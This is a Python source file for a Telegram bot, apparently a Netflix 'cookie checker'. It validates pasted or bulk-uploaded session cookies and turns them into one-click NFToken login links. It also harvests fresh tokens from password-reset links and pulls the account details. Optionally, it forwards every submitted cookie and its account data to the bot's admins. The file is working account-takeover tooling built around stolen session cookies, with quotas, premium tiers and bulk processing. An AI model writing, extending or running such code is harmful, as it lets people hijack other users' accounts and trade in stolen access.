import asyncio
import hashlib
import html
import logging
import os
import secrets
import tempfile
import time
import re
from datetime import datetime   # <-- FIXED: added import

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from premium_emoji import pe, premium_button, premium_login_keyboard_rows
from telegram.error import BadRequest, TelegramError
from telegram.ext import ContextTypes

from config import ADMIN_IDS, CHANNEL_USERNAME, CHANNEL_URL, DATA_DIR, SEND_COOKIE_TO_ADMIN
from db import (
    get_all_user_ids,
    get_public_stats,
    get_pending_file_record,
    get_user_limits,
    get_user_usage,
    increment_user_usage,
    is_user_banned,
    remove_pending_file,
    record_check_metric,
    save_pending_file,
    save_user_check,
    search_users,
    upsert_user_profile,
)
from file_processing import (
    UploadValidationError,
    cancellation_flags,
    dedupe_cookie_records,
    estimate_file_wait_seconds,
    extract_upload_text,
    format_duration,
    get_file_queue_snapshot,
    merge_adjacent_credentials,
    process_file_full_check,
    process_file_one_by_one,
    process_file_quick_check,
    split_cookie_records,
    telegram_call_with_retries,
    user_has_active_file_job,
    validate_document_size,
    log_cookie_for_daily,
    process_cookies_one_by_one_direct,
    process_reset_links_file,
    notify_admin_of_file_check,
    processing_executor,
)
from netflix_client import (
    NetflixAccountInfoExtractor,
    build_nftoken_login_urls,
    convert_netscape_to_header_string,
    extract_nftoken_from_text,
    get_cookie_candidates,
    extract_netflix_url_from_text,
)
from handlers.admin import (
    admin_dashboard_callback,
    admin_health_callback,
    admin_premium_users_callback,
    admin_search_prompt_callback,
    admin_stats_callback,
    list_users_paged,
    send_backup,
    show_user_management,
    handle_user_management,
)

logger = logging.getLogger(__name__)

RESET_INFO_TTL_SECONDS = 15 * 60
PENDING_RESET_INFO: dict[str, dict[str, object]] = {}
BOT_STARTED_AT = time.time()


def _format_uptime(seconds: float) -> str:
    seconds = max(0, int(seconds))
    days, remainder = divmod(seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, _ = divmod(remainder, 60)
    parts = []
    if days:
        parts.append(f"{days}d")
    if hours or days:
        parts.append(f"{hours}h")
    parts.append(f"{minutes}m")
    return " ".join(parts)


async def _notify_admins(context: ContextTypes.DEFAULT_TYPE, title: str, user, body: str) -> None:
    username = user.username or user.first_name or "Unknown"
    safe_username = html.escape(str(username))
    message = (
        f"<b>{html.escape(title)}</b>\n\n"
        f"<b>User:</b> @{safe_username}\n"
        f"<b>ID:</b> <code>{user.id}</code>\n\n"
        f"{body}"
    )
    for admin_id in ADMIN_IDS:
        try:
            await telegram_call_with_retries(context.bot.send_message, chat_id=admin_id, text=message, parse_mode='HTML')
        except TelegramError as exc:
            logger.warning("Failed to notify admin %s: %s", admin_id, exc)


def _cookie_fingerprint(cookie_text: str) -> str:
    return hashlib.sha256(cookie_text.encode('utf-8', errors='ignore')).hexdigest()[:12]


def _cleanup_pending_reset_info() -> None:
    now = time.time()
    expired_keys = [
        key for key, info in PENDING_RESET_INFO.items()
        if now - float(info.get('created_at', 0)) > RESET_INFO_TTL_SECONDS
    ]
    for key in expired_keys:
        PENDING_RESET_INFO.pop(key, None)


def _store_pending_reset_info(user_id: int, token: str, final_url: str | None, source_url: str | None) -> str:
    _cleanup_pending_reset_info()
    key = secrets.token_urlsafe(8)
    PENDING_RESET_INFO[key] = {
        'user_id': user_id,
        'token': token,
        'final_url': final_url or '',
        'source_url': source_url or 'N/A',
        'created_at': time.time(),
    }
    return key


def build_login_keyboard(token: str | None, account_info_key: str | None = None) -> InlineKeyboardMarkup | None:
    if not token:
        return None
    urls = build_nftoken_login_urls(token)
    rows = premium_login_keyboard_rows(urls)
    if account_info_key:
        rows.append([premium_button("Check Account Info", callback_data=f"reset_info_{account_info_key}", emoji="search", style="primary")])
    return InlineKeyboardMarkup(rows)


async def send_long_combined_result(update: Update, context: ContextTypes.DEFAULT_TYPE, cookie_text: str, account_info: str) -> None:
    """Fallback when cookie + details exceed Telegram's text-message limit."""
    temp_path = None
    try:
        plain_account_info = account_info.replace("<b>", "").replace("</b>", "")
        with tempfile.NamedTemporaryFile(delete=False, suffix='.txt', mode='w', encoding='utf-8') as result_file:
            result_file.write(f"Cookie:\n{cookie_text}\n\nAccount Info:\n{plain_account_info}")
            temp_path = result_file.name

        with open(temp_path, 'rb') as document:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=document,
                filename="Cookie_and_Details.txt",
                caption="🍪 Cookie and account details",
            )
    except (OSError, TelegramError) as exc:
        logger.warning("Could not send combined result file to user %s: %s", update.effective_user.id, exc)
    finally:
        if temp_path and os.path.exists(temp_path):
            os.unlink(temp_path)


async def check_channel_membership(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    return True


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    message = update.message

    if not await check_channel_membership(update, context):
        return
        
    user = update.effective_user

    if is_user_banned(user.id):
        if query:
            await query.edit_message_text("❌ You are banned from using this bot.")
        elif message:
            await message.reply_text("❌ You are banned from using this bot.")
        return

    if message:
        _, _, _, _ = get_user_usage(user.id)
    upsert_user_profile(user.id, user.username or user.first_name or "Unknown")

    usage_count, file_checks_count, is_premium, _ = get_user_usage(user.id)
    daily_limit, file_daily_limit = get_user_limits(user.id)
    remaining = daily_limit - usage_count
    file_remaining = file_daily_limit - file_checks_count
    
    keyboard = [
        [premium_button("My Limits", callback_data="user_stats", emoji="chart", style="primary")],
        [premium_button("Report Issue", callback_data="report_issue", emoji="tools", style="danger"), premium_button("Request Premium", callback_data="request_premium", emoji="star", style="success")],
        [premium_button("Help", callback_data="show_help", emoji="question", style="primary")],
    ]
    if user.id in ADMIN_IDS:
        keyboard.insert(0, [premium_button("Admin Dashboard", callback_data="admin_dashboard", emoji="compass", style="primary")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    user_type = f"{pe('crown')} Admin" if user.id in ADMIN_IDS else f"{pe('star')} Premium" if is_premium else f"{pe('user')} Regular"
    start_message = (
        f"{pe('crown')} <b>Cookie Checker</b>\n\n"
        f"Hi {user.mention_html()}.\n"
        f"<b>Status:</b> {user_type}\n"
        f"<b>Single:</b> {usage_count}/{'∞' if daily_limit == float('inf') else daily_limit} "
        f"({'∞' if remaining == float('inf') else remaining} left)\n"
        f"<b>Files:</b> {file_checks_count}/{'∞' if file_daily_limit == float('inf') else file_daily_limit} "
        f"({'∞' if file_remaining == float('inf') else file_remaining} left)\n\n"
        "Send cookie text directly, upload a file, or choose an option below."
    )

    if query:
        await query.edit_message_text(
            start_message,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    elif message:
        await message.reply_html(
            start_message,
            reply_markup=reply_markup
        )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_membership(update, context):
        return
    user = update.effective_user
    
    if is_user_banned(user.id):
        await update.message.reply_text(f"{pe('error')} You are banned from using this bot.", parse_mode='HTML')
        return
        
    help_text = """
    <b>Netflix Account Info Bot Help</b>

    Use the inline buttons from the main menu:

    1. Send one cookie text directly, and bot will check it automatically.
    2. Or send a .txt/.zip/.rar file directly.
    3. Review the file summary before processing.
    4. Use My Limits to see your remaining quota.
    """
    await update.message.reply_text(help_text, parse_mode='HTML')


async def myacc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_membership(update, context):
        return
        
    user = update.effective_user
    
    if is_user_banned(user.id):
        await update.message.reply_text(f"{pe('error')} You are banned from using this bot.", parse_mode='HTML')
        return
        
    usage_count, file_checks_count, is_premium, is_banned = get_user_usage(user.id)
    daily_limit, file_daily_limit = get_user_limits(user.id)
    
    remaining = daily_limit - usage_count
    file_remaining = file_daily_limit - file_checks_count
    
    user_type = f"{pe('crown')} Admin" if user.id in ADMIN_IDS else f"{pe('star')} Premium" if is_premium else f"{pe('user')} Regular"
    
    message = (
        f"{pe('user')} <b>Account Info for {user.mention_html()}</b>\n\n"
        f"<b>Account Type:</b> {user_type}\n\n"
        f"{pe('chart')} <b>Today's Usage:</b>\n"
        f"• Single Checks Left: <b>{'∞' if remaining == float('inf') else remaining}</b> / {'∞' if daily_limit == float('inf') else daily_limit}\n"
        f"• File Checks Left: <b>{'∞' if file_remaining == float('inf') else file_remaining}</b> / {'∞' if file_daily_limit == float('inf') else file_daily_limit}\n\n"
        f"{pe('rocket')} <b>Concurrent Processing:</b> {pe('success')} Enabled"
    )
    
    await update.message.reply_html(message)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please use the 'Cancel' button during file processing.")


# ========== WORKER FUNCTIONS ==========

def _run_get_nftoken_only_worker(raw_text: str, user_id: int):
    """Fast check: validate cookie and get NFToken, without account info."""
    extractor = NetflixAccountInfoExtractor()
    extractor.detect_email_password(raw_text)
    candidates = get_cookie_candidates(raw_text)
    if not candidates:
        record_check_metric(user_id, "unknown")
        return {"status": "format_error"}

    valid_cookie_part = None
    for cookie_part in candidates:
        cookie_type = extractor.load_cookies_from_input(cookie_part)
        if not cookie_type:
            continue
        if extractor.check_cookies_validity():
            valid_cookie_part = cookie_part
            break

    if not valid_cookie_part:
        record_check_metric(user_id, "expired")
        return {"status": "invalid"}

    # Generate NFToken (fast)
    extractor.get_nftoken(valid_cookie_part)
    nftoken = extractor.nftoken_info.get('token')
    return {
        "status": "success",
        "cookie": valid_cookie_part,
        "nftoken": nftoken,
        "extractor": extractor,
    }

def _run_account_info_only_worker(extractor, cookie_part, user_id):
    """Fetch full account info using an existing extractor (reuse session)."""
    try:
        if extractor.get_account_info(cookie_part, fetch_nftoken=False):
            account_info = extractor.format_account_info()
            account_status = extractor.account_data.get('AccountStatus', 'unknown')
            record_check_metric(user_id, account_status)
            return {"status": "success", "account_info": account_info, "account_status": account_status}
        else:
            record_check_metric(user_id, "unknown")
            return {"status": "failed"}
    except Exception as e:
        logger.error(f"Error fetching account info in background: {e}")
        return {"status": "error"}

def _run_reset_link_worker(raw_text: str):
    """Offloads the network request to fetch the reset link."""
    extractor = NetflixAccountInfoExtractor()
    token, final_url = extractor.follow_reset_link_and_get_token(raw_text)
    return token, final_url

def _run_reset_account_info_worker(token: str, user_id: int):
    """Offloads the network request to fetch account info from a token."""
    extractor = NetflixAccountInfoExtractor()
    if not extractor.load_session_from_nftoken(token):
        record_check_metric(user_id, "unknown")
        return {"error": "load_failed"}

    if not extractor.get_account_info(fetch_nftoken=False):
        record_check_metric(user_id, "unknown")
        return {"error": "info_failed"}

    account_info = extractor.format_account_info()
    record_check_metric(user_id, extractor.account_data.get('AccountStatus', 'unknown'))
    return {"success": True, "account_info": account_info}

# ========== BACKGROUND TASKS ==========

async def _fetch_account_info_and_update(context, chat_id, message_id, extractor, user_id, cookie_part, user):
    """Background task: fetch account info and edit the message."""
    try:
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            processing_executor,
            _run_account_info_only_worker,
            extractor,
            cookie_part,
            user_id
        )
        # Build final message
        if result["status"] == "success":
            account_info = result["account_info"]
            account_status = result.get("account_status", "unknown")
            combined = (
                f"{pe('cookie')} <b>Cookie Used:</b>\n"
                f"<code>{html.escape(cookie_part)}</code>\n\n"
                f"{account_info}"
            )
            reply_markup = build_login_keyboard(extractor.nftoken_info.get('token'))
        else:
            combined = (
                f"{pe('cookie')} <b>Cookie Used:</b>\n"
                f"<code>{html.escape(cookie_part)}</code>\n\n"
                f"{pe('warning')} Could not fetch full account details, but login buttons are ready."
            )
            reply_markup = build_login_keyboard(extractor.nftoken_info.get('token'))
            account_status = "unknown"

        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=combined,
            parse_mode='HTML',
            disable_web_page_preview=True,
            reply_markup=reply_markup,
        )
        # Save check and notify admin
        if result["status"] == "success":
            increment_user_usage(user_id)
            username = user.username or user.first_name
            save_user_check(user_id, username, account_info, "Single_Cookie")
            # Admin notification – conditionally send cookie
            if user_id not in ADMIN_IDS:
                safe_username = html.escape(str(username))
                if SEND_COOKIE_TO_ADMIN:
                    # Send full details
                    admin_message = (
                        f"👤 User @{safe_username} (ID: {user_id}) checked an account:\n\n"
                        f"<b>Cookie Used:</b>\n"
                        f"<code>{html.escape(cookie_part)}</code>\n\n"
                        f"<b>Result:</b>\n{account_info}"
                    )
                    if len(admin_message) > 3900:
                        # fallback to file
                        temp_path = None
                        try:
                            with tempfile.NamedTemporaryFile(delete=False, suffix='.txt', mode='w', encoding='utf-8') as f:
                                plain_account = account_info.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                                f.write(f"User: @{username} (ID: {user_id})\n\nCookie:\n{cookie_part}\n\nAccount Info:\n{plain_account}")
                                temp_path = f.name
                            with open(temp_path, 'rb') as doc:
                                for admin_id in ADMIN_IDS:
                                    try:
                                        await context.bot.send_document(
                                            chat_id=admin_id,
                                            document=doc,
                                            filename=f"user_{user_id}_cookie.txt",
                                            caption=f"📄 Cookie from @{safe_username}"
                                        )
                                    except TelegramError as e:
                                        logger.error(f"Failed to send cookie file to admin {admin_id}: {e}")
                        finally:
                            if temp_path and os.path.exists(temp_path):
                                os.unlink(temp_path)
                    else:
                        for admin_id in ADMIN_IDS:
                            try:
                                await context.bot.send_message(
                                    chat_id=admin_id,
                                    text=admin_message,
                                    parse_mode='HTML',
                                    disable_web_page_preview=True,
                                )
                            except TelegramError as e:
                                logger.error(f"Failed to send message to admin {admin_id}: {e}")
                else:
                    # Summary only
                    admin_summary = (
                        f"👤 User @{safe_username} (ID: {user_id}) checked a single account.\n"
                        f"Status: {account_status}\n"
                        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )
                    for admin_id in ADMIN_IDS:
                        try:
                            await context.bot.send_message(chat_id=admin_id, text=admin_summary)
                        except TelegramError as e:
                            logger.error(f"Failed to send summary to admin {admin_id}: {e}")
    except Exception as e:
        logger.error(f"Background account info fetch failed: {e}")
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"{pe('warning')} Failed to fetch account details, but login buttons are still available.",
            reply_markup=build_login_keyboard(extractor.nftoken_info.get('token')),
        )


async def _fetch_account_info_from_reset_token(context, chat_id, message_id, token, user_id, user):
    """Background task for reset links: fetch account info and edit message."""
    try:
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(processing_executor, _run_reset_account_info_worker, token, user_id)
        if "error" in result:
            msg = f"{pe('warning')} Could not load full account details, but login buttons still work."
        else:
            msg = result["account_info"]
        # Edit the message with the full info
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=msg,
            parse_mode='HTML',
            reply_markup=build_login_keyboard(token),
            disable_web_page_preview=True,
        )
        # Save check and notify admins
        if "error" not in result:
            increment_user_usage(user_id)
            username = user.username or user.first_name
            save_user_check(user_id, username, msg, "Reset_Link")
            if user_id not in ADMIN_IDS:
                safe_username = html.escape(str(username))
                if SEND_COOKIE_TO_ADMIN:
                    # Detailed notification
                    admin_message = (
                        f"👤 User @{safe_username} (ID: {user_id}) checked a reset link:\n\n"
                        f"<b>NFToken:</b> redacted (sha256:{_cookie_fingerprint(token)})\n\n"
                        f"<b>Result:</b>\n{msg}"
                    )
                    for admin_id in ADMIN_IDS:
                        try:
                            await context.bot.send_message(
                                chat_id=admin_id,
                                text=admin_message,
                                parse_mode='HTML',
                                disable_web_page_preview=True,
                            )
                        except TelegramError as e:
                            logger.error(f"Failed to send reset notification to admin {admin_id}: {e}")
                else:
                    # Summary only
                    admin_summary = (
                        f"👤 User @{safe_username} (ID: {user_id}) checked a reset link.\n"
                        f"Status: success\n"
                        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )
                    for admin_id in ADMIN_IDS:
                        try:
                            await context.bot.send_message(chat_id=admin_id, text=admin_summary)
                        except TelegramError as e:
                            logger.error(f"Failed to send reset summary to admin {admin_id}: {e}")
    except Exception as e:
        logger.error(f"Background reset info fetch failed: {e}")
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"{pe('warning')} Failed to fetch account details, but login buttons are still available.",
            reply_markup=build_login_keyboard(token),
        )

async def process_single_cookie_instant(update, context, raw_text, user_id):
    """Process a single cookie: instant login links + background account fetch."""
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(processing_executor, _run_get_nftoken_only_worker, raw_text, user_id)
    if result["status"] != "success":
        await update.message.reply_text("❌ Invalid cookie. Could not generate login links.")
        return

    cookie_part = result["cookie"]
    token = result["nftoken"]
    extractor = result["extractor"]

    # Send instant message with login buttons and placeholder
    reply_markup = build_login_keyboard(token)
    msg = await update.message.reply_text(
        f"{pe('success')} <b>Login links ready!</b>\n\nFetching account details...",
        parse_mode='HTML',
        reply_markup=reply_markup,
        disable_web_page_preview=True,
    )

    # Start background task to fetch full account info and edit message
    asyncio.create_task(
        _fetch_account_info_and_update(
            context,
            update.effective_chat.id,
            msg.message_id,
            extractor,
            user_id,
            cookie_part,
            update.effective_user
        )
    )


async def process_reset_link(update: Update, context: ContextTypes.DEFAULT_TYPE, raw_text: str):
    user = update.effective_user
    user_id = user.id
    pasted_token = extract_nftoken_from_text(raw_text)
    if not pasted_token:
        await update.message.reply_text("Could not find an nftoken in that Netflix link.")
        return

    prelim_msg = await update.message.reply_text(
        "⏳ Extracting new token...",
        parse_mode='HTML',
    )

    try:
        loop = asyncio.get_running_loop()
        token, final_url = await loop.run_in_executor(processing_executor, _run_reset_link_worker, raw_text)
        
        if not token:
            await prelim_msg.edit_text(
                "❌ I could not extract a new NFToken from that reset link.\n\n"
                "The original reset token was ignored so old-token login buttons are not sent."
            )
            return

        # Store pending info for optional manual callback (keep for fallback)
        info_key = _store_pending_reset_info(
            user_id=user_id,
            token=token,
            final_url=final_url,
            source_url=extract_netflix_url_from_text(raw_text),
        )
        reply_markup = build_login_keyboard(token)  # no account info button now (we auto-fetch)
        await prelim_msg.edit_text(
            f"{pe('success')} <b>Login buttons ready!</b>\n\n"
            f"Fetching account details...",
            parse_mode='HTML',
            disable_web_page_preview=True,
            reply_markup=reply_markup,
        )

        # Start background fetch
        asyncio.create_task(
            _fetch_account_info_from_reset_token(
                context,
                update.effective_chat.id,
                prelim_msg.message_id,
                token,
                user_id,
                user
            )
        )

    except (TelegramError, KeyError, ValueError) as e:
        logger.error(f"Error processing reset link: {e}")
        await prelim_msg.edit_text(
            "❌ An error occurred while processing that reset link. Please try again.",
            reply_markup=reply_markup,
        )


async def process_reset_account_info_callback(query, context: ContextTypes.DEFAULT_TYPE, key: str):
    """Legacy callback for manual 'Check Account Info' button (still available)."""
    _cleanup_pending_reset_info()
    info = PENDING_RESET_INFO.get(key)
    if not info or info.get('user_id') != query.from_user.id:
        await query.edit_message_text("❌ This account-info button expired. Send the reset link again.")
        return

    token = str(info['token'])
    reply_markup = build_login_keyboard(token)
    await query.edit_message_text(
        f"{pe('success')} <b>Premium login buttons are ready.</b>\n\n"
        f"{pe('hourglass')} Fetching full account details...",
        parse_mode='HTML',
        reply_markup=reply_markup,
        disable_web_page_preview=True,
    )

    try:
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(processing_executor, _run_reset_account_info_worker, token, query.from_user.id)
        
        if "error" in result:
            msg = f"{pe('warning')} Account details could not be loaded from this reset link." if result["error"] == "load_failed" else f"{pe('warning')} Full account details could not be loaded, but the login buttons may still work."
            await query.edit_message_text(
                f"{pe('success')} <b>Premium login buttons are ready.</b>\n\n{msg}",
                parse_mode='HTML',
                reply_markup=reply_markup,
                disable_web_page_preview=True,
            )
            return

        account_info = result["account_info"]
        await query.edit_message_text(
            account_info,
            parse_mode='HTML',
            disable_web_page_preview=True,
            reply_markup=reply_markup,
        )

        PENDING_RESET_INFO.pop(key, None)
        increment_user_usage(query.from_user.id)
        username = query.from_user.username or query.from_user.first_name
        save_user_check(query.from_user.id, username, account_info, "Reset_Link_NFToken")

    except (TelegramError, KeyError, ValueError) as e:
        logger.error(f"Error processing reset account-info callback: {e}")
        await query.edit_message_text(
            "❌ An error occurred while fetching account info. Please try again.",
            reply_markup=reply_markup,
        )


async def handle_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_membership(update, context):
        return
    user = update.effective_user
    user_id = user.id

    if is_user_banned(user.id):
        await update.message.reply_text(f"{pe('error')} You are banned from using this bot.", parse_mode='HTML')
        return

    if await handle_admin_text_flow(update, context):
        return

    if await handle_support_message(update, context):
        return

    input_mode = context.user_data.pop("input_mode", None)
    if input_mode == "file_upload":
        context.user_data["input_mode"] = "file_upload"
        await update.message.reply_text("Please send the file directly, or go back to the main menu.")
        return

    usage_count, _, _, _ = get_user_usage(user.id)
    daily_limit, _ = get_user_limits(user.id)
    
    if usage_count >= daily_limit:
        await update.message.reply_text(f"❌ You have reached your daily limit of {daily_limit} single checks.")
        return

    raw_text = update.message.text

    # --- MULTI-LINK / RESET LINK HANDLING ---
    reset_link_matches = re.findall(r'https?://(?:www\.)?netflix\.com/[^\s<>"\']*nftoken=[^\s<>"\']+', raw_text, re.IGNORECASE)
    
    if reset_link_matches:
        unique_reset_links = []
        seen_links = set()
        for link in reset_link_matches:
            if link not in seen_links:
                seen_links.add(link)
                unique_reset_links.append(link)
        
        if len(unique_reset_links) > 1:
            # Bulk reset links: treat as file
            pending_dir = DATA_DIR / "pending_uploads"
            pending_dir.mkdir(parents=True, exist_ok=True)
            temp_path = None
            try:
                with tempfile.NamedTemporaryFile(
                    delete=False,
                    suffix='.txt',
                    prefix=f"user_{user_id}_",
                    dir=pending_dir,
                    mode='w',
                    encoding='utf-8',
                ) as new_file:
                    new_file.write('\n'.join(unique_reset_links))
                    temp_path = new_file.name

                file_id = save_pending_file(
                    user_id,
                    temp_path,
                    source_label="Text Message",
                    total_records=len(unique_reset_links),
                    unique_records=len(unique_reset_links),
                    duplicate_records=len(reset_link_matches) - len(unique_reset_links),
                    original_filename="reset_links.txt",
                )
                await process_reset_links_file(update, context, file_id, user_id)
            except Exception as e:
                logger.error(f"Error processing multi-link text: {e}")
                await update.message.reply_text("An error occurred while processing your links.")
                if temp_path and os.path.exists(temp_path):
                    os.unlink(temp_path)
            return
            
        elif len(unique_reset_links) == 1:
            await process_reset_link(update, context, unique_reset_links[0])
            return

    # --- MULTI-COOKIE (file-like) ---
    records = split_cookie_records(raw_text)
    if len(records) > 1:
        unique_records = []
        seen = set()
        for rec in records:
            rec_clean = rec.strip()
            if rec_clean and rec_clean not in seen:
                seen.add(rec_clean)
                unique_records.append(rec_clean)
        if not unique_records:
            await update.message.reply_text("No valid records found.")
            return

        pending_dir = DATA_DIR / "pending_uploads"
        pending_dir.mkdir(parents=True, exist_ok=True)
        temp_path = None
        try:
            with tempfile.NamedTemporaryFile(
                delete=False,
                suffix='.txt',
                prefix=f"user_{user_id}_",
                dir=pending_dir,
                mode='w',
                encoding='utf-8',
            ) as new_file:
                new_file.write('\n'.join(unique_records))
                temp_path = new_file.name

            file_id = save_pending_file(
                user_id,
                temp_path,
                source_label="Text Message",
                total_records=len(unique_records),
                unique_records=len(unique_records),
                duplicate_records=0,
                original_filename="message.txt",
            )
            temp_path = None
            await process_cookies_one_by_one_direct(update, context, file_id, user_id)
        except Exception as e:
            logger.error(f"Error processing multi-cookie text: {e}")
            await update.message.reply_text("An error occurred while processing your text.")
            if temp_path and os.path.exists(temp_path):
                os.unlink(temp_path)
        return

    # Single cookie
    await process_single_cookie_instant(update, context, raw_text, user_id)


# ========== REMAINING HANDLERS ==========

async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if not await check_channel_membership(update, context):
        return

    user_id = query.from_user.id
    
    if is_user_banned(user_id):
        await query.edit_message_text("❌ You are banned from using this bot.")
        return

    data = query.data

    if data in {"premium_emoji_test", "normal_emoji_test"}:
        await query.answer("Emoji button test clicked ✅", show_alert=False)
        return

    if data == "admin_dashboard":
        await admin_dashboard_callback(query, context)
        return

    if data == "admin_health":
        await admin_health_callback(query, context)
        return

    if data == "admin_search_user":
        await admin_search_prompt_callback(query, context)
        return

    if data == "admin_broadcast":
        if user_id not in ADMIN_IDS:
            await query.answer("Not authorized.", show_alert=True)
            return
        context.user_data["admin_mode"] = "broadcast_draft"
        await query.edit_message_text(
            "📢 <b>Broadcast</b>\n\nSend the message you want to broadcast. You will see a preview before it is sent.",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[premium_button("Dashboard", callback_data="admin_dashboard", emoji="compass", style="primary")]]),
        )
        return

    if data == "admin_broadcast_cancel":
        context.user_data.pop("broadcast_draft", None)
        context.user_data.pop("admin_mode", None)
        await admin_dashboard_callback(query, context)
        return

    if data == "admin_broadcast_confirm":
        if user_id not in ADMIN_IDS:
            await query.answer("Not authorized.", show_alert=True)
            return
        draft = context.user_data.pop("broadcast_draft", None)
        if not draft:
            await query.edit_message_text("No broadcast draft found.", reply_markup=InlineKeyboardMarkup([[premium_button("Dashboard", callback_data="admin_dashboard", emoji="compass", style="primary")]]))
            return
        user_ids = get_all_user_ids()
        await query.edit_message_text(f"📢 Sending broadcast to {len(user_ids)} users...")
        success_count = 0
        fail_count = 0
        for target_user_id in user_ids:
            try:
                await telegram_call_with_retries(context.bot.send_message, chat_id=target_user_id, text=draft)
                success_count += 1
            except TelegramError as exc:
                fail_count += 1
                logger.warning("Failed broadcast to %s: %s", target_user_id, exc)
            await asyncio.sleep(0.05)
        await query.edit_message_text(
            f"📢 <b>Broadcast Complete</b>\n\n✅ Sent: {success_count}\n❌ Failed: {fail_count}",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[premium_button("Dashboard", callback_data="admin_dashboard", emoji="compass", style="primary")]]),
        )
        return

    if data == "show_help":
        await show_help_callback(query, context)
        return

    if data == "check_single_cookie":
        context.user_data["input_mode"] = "single_cookie"
        keyboard = [[premium_button("Back", callback_data="back_to_start", emoji="left", style="primary")]]
        await query.edit_message_text(
            f"{pe('search')} <b>Cookie Check</b>\n\nSend one cookie text message now.",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    if data == "public_stats":
        if user_id not in ADMIN_IDS:
            await query.answer("Admin only.", show_alert=True)
            return
        await public_stats_callback(query, context)
        return

    if data == "report_issue":
        await report_issue_callback(query, context)
        return

    if data == "request_premium":
        await request_premium_callback(query, context)
        return

    if data.startswith('reset_info_'):
        await process_reset_account_info_callback(query, context, data.removeprefix('reset_info_'))
        return

    if data.startswith('full_check_'):
        file_id = int(data.split('_')[-1])
        keyboard = [
            [InlineKeyboardButton("📨 One by One", callback_data=f"one_by_one_{file_id}")],
            [InlineKeyboardButton("📦 All at Once (in a file)", callback_data=f"all_at_once_{file_id}")],
            [premium_button("Main Menu", callback_data="back_to_start", emoji="home", style="primary")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("How would you like to receive the full check results?", reply_markup=reply_markup)

    elif data.startswith('all_at_once_'):
        if user_has_active_file_job(user_id):
            await query.answer("You already have a file check running or queued.", show_alert=True)
            return
        file_id = int(data.split('_')[-1])
        asyncio.create_task(process_file_full_check(query, context, file_id, user_id))

    elif data.startswith('one_by_one_'):
        if user_has_active_file_job(user_id):
            await query.answer("You already have a file check running or queued.", show_alert=True)
            return
        file_id = int(data.split('_')[-1])
        asyncio.create_task(process_file_one_by_one(query, context, file_id, user_id))
        
    elif data.startswith('quick_check_'):
        if user_has_active_file_job(user_id):
            await query.answer("You already have a file check running or queued.", show_alert=True)
            return
        file_id = int(data.split('_')[-1])
        asyncio.create_task(process_file_quick_check(query, context, file_id, user_id))

    elif data.startswith('discard_file_'):
        file_id = int(data.split('_')[-1])
        file_data = get_pending_file_record(file_id)
        if not file_data or int(file_data.get('user_id', 0)) != user_id:
            await query.edit_message_text("❌ File not found, expired, or unauthorized.")
            return
        file_path = str(file_data.get('file_path') or '')
        remove_pending_file(file_id)
        if file_path and os.path.exists(file_path):
            try:
                os.unlink(file_path)
            except OSError as exc:
                logger.warning("Could not remove discarded pending file %s: %s", file_path, exc)
        await query.edit_message_text(
            "✅ Upload discarded.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="back_to_start")]]),
        )
    
    elif data.startswith("list_users_page_"):
        page = int(data.split('_')[-1])
        await list_users_paged(update, context, page=page)

    elif data.startswith("user_info_"):
        target_user_id = int(data.split('_')[-1])
        await show_user_management(query, context, target_user_id)
    
    elif data.startswith("manage_user_"):
        parts = data.split('_')
        target_user_id = int(parts[2])
        action = "_".join(parts[3:])
        await handle_user_management(query, context, target_user_id, action)
    
    elif data.startswith("cancel_process_"):
        target_id = int(data.split('_')[-1])
        if target_id == user_id:
            cancellation_flags[user_id] = True
            try:
                await query.answer("🛑 Cancellation requested! The process will stop shortly.", show_alert=True)
                await query.edit_message_reply_markup(reply_markup=None)
            except TelegramError:
                pass
        else:
            await query.answer("❌ Cannot cancel process for another user.", show_alert=True)

    elif data == "admin_stats": 
        await admin_stats_callback(query, context)
    elif data == "admin_backup":
        await query.message.reply_text("🔄 Generating and sending backup...")
        await send_backup(context, chat_id_to_notify=user_id)
    elif data == "admin_premium_users": 
        await admin_premium_users_callback(query, context)
    elif data == "admin_add_premium": 
        await query.edit_message_text("Use Search User, open the user, then tap Add Premium.")
    elif data == "admin_remove_premium": 
        await query.edit_message_text("Use Search User, open the user, then tap Remove Premium.")
    elif data == "user_stats": 
        await user_stats_callback(query, context)
    elif data == "user_check_file":
        context.user_data["input_mode"] = "file_upload"
        await query.edit_message_text(
            "📁 <b>File Check</b>\n\nSend a .txt, .zip, or .rar file. I will show a summary before processing.",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[premium_button("Back", callback_data="back_to_start", emoji="left", style="primary")]]),
        )
    elif data == "back_to_start":
        await start(update, context)


